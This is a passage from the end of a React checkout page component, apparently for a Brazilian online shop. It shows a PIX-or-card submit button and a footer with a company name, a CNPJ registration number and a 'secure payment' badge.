            <button type="submit" className="checkout-submit-btn" disabled={isSubmitting}>
              <span>{paymentMethod === "pix" ? "FINALIZAR PEDIDO VIA PIX" : "FINALIZAR COMPRA NO CARTÃO"}</span>
              <ArrowRight size={18} />
            </button>
          </form>
        )}
      </main>

      {/* Footer */}
      <footer className="checkout-footer">
        <p className="checkout-footer__text">MIRACLE - CNPJ: 59.291.162/0001-79 | Todos os direitos reservados</p>
        <div className="checkout-footer__security">
          <Lock size={14} color="#000" />
          <span>PAGAMENTO 100% SEGURO</span>
        </div>
      </footer>
    </div>
  );
};
